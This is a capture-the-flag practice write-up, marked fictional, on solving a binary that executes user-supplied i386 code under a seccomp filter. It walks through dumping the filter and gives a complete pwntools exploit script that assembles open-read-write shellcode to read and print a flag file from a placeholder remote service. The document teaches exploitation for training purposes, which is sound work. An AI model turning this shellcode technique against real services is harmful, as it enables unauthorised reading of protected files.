---
title: "ORW Shellcode Under a Seccomp Filter"
description: "A practice write-up for a generic shellcode challenge: a binary runs attacker-supplied i386 code under a seccomp filter that only allows open, read, write and exit."
pubDate: 2026-11-15
category: "CTF"
tags: ["Pwn", "Shellcode", "Seccomp"]
difficulty: "Medium"
event: "Practice"
draft: false
---

> **Note:** This is a **practice / demo write-up**. The challenge, binary, host name and flag below are generic and fictional, written to show how an ORW (open-read-write) shellcode solution is structured. They do not come from a real CTF or a real service.

## 1. Challenge Overview

The challenge ships a single 32-bit ELF binary, `orw`, and a remote service running it. The program:

1. Prints a prompt and reads up to `0x100` bytes of attacker-controlled input.
2. Copies that input into a freshly `mmap`-ed page with read, write and execute permissions.
3. Installs a seccomp filter that allows only a small set of system calls.
4. Jumps to the page and runs the input as code.

The flag lives at `/home/orw/flag`, which the shellcode can read but we cannot. Since the seccomp filter blocks `execve`, a normal `/bin/sh` shell is out of reach, so the shellcode has to read the flag itself and print it. That is the ORW pattern: **open** the file, **read** it, **write** it to stdout.

## 2. Analysis

First, check the protections:

```console
$ checksec ./orw
[*] '/home/player/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

NX is enabled, so shellcode placed on the stack would not run. That is not a problem here, because the program maps its own RWX page and calls it. The interesting part is the filter, which we can dump with `seccomp-tools`:

```console
$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0x40000003  if (A != ARCH_I386) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x05 0x00 0x00000001  if (A == exit) goto 0009
 0004: 0x15 0x04 0x00 0x00000003  if (A == read) goto 0009
 0005: 0x15 0x03 0x00 0x00000004  if (A == write) goto 0009
 0006: 0x15 0x02 0x00 0x00000005  if (A == open) goto 0009
 0007: 0x15 0x01 0x00 0x000000fc  if (A == exit_group) goto 0009
 0008: 0x06 0x00 0x00 0x80000000  return KILL
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

The filter allows `open` (5), `read` (3), `write` (4), `exit` (1) and `exit_group` (252) for the i386 ABI, and kills the process on anything else, including `execve` (11) and `socketcall`. So the shellcode must be built from these five calls only.

Because the program reads its input directly and calls it, there is no encoding or length check on our side beyond `0x100` bytes. The whole problem reduces to writing a short i386 ORW shellcode that fits.

## 3. Exploitation

We use pwntools. `shellcraft` generates the i386 assembly for each syscall, and `asm` assembles the result into bytes.

```python title="solve.py"
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

# Local run (for testing against the binary):
# io = process('./orw')
# Remote service (placeholder host for this practice write-up):
io = remote('orw.practice.example', 1337)

# open("/home/orw/flag", 0)  -> fd returned in eax
shellcode = shellcraft.open('/home/orw/flag')

# read(fd, esp, 0x40)       -> the file contents are placed on the stack at esp
shellcode += shellcraft.read('eax', 'esp', 0x40)

# write(1, esp, 0x40)       -> print the bytes to stdout
shellcode += shellcraft.write(1, 'esp', 0x40)

payload = asm(shellcode)
log.info(f"shellcode length: {len(payload)} bytes")

io.recvuntil(b'shellcode')     # wait for the prompt
io.send(payload)

flag = io.recvall(timeout=2)
log.success(f"output: {flag.decode(errors='replace')}")
```

The steps map directly onto the ORW pattern:

- `shellcraft.open` pushes the path onto the stack and calls `open(path, 0)`. The file descriptor comes back in `eax`.
- `shellcraft.read` reads up to 0x40 bytes from that descriptor into the stack buffer at `esp`.
- `shellcraft.write` sends those bytes to file descriptor 1, which is the socket we are connected to.

Because every call is one of the five whitelisted syscalls, the filter lets the whole sequence through.

## 4. Result

Running the script prints the flag contents from the service (fictional value for this write-up):

```console
$ python3 solve.py
[+] Opening connection to orw.practice.example on port 1337: Done
[*] shellcode length: 71 bytes
[+] output: flag{practice_orw_not_a_real_flag}
```

## 5. Takeaways

- **Read the filter before writing shellcode.** `seccomp-tools dump` tells you exactly which syscalls survive, and the architecture check matters: a 64-bit syscall number in an i386 filter is a common mistake.
- **ORW beats shell when `execve` is blocked.** If the flag is readable by the process, reading and writing it directly needs only three syscalls.
- **Let pwntools do the encoding.** `shellcraft` and `asm` avoid hand-written syscall numbers and register juggling, which keeps the exploit small and easy to debug.
- **Keep the buffer short.** The input limit here is 256 bytes. Shorter shellcode is less likely to be broken by a changed read size or an off-by-one in the challenge.
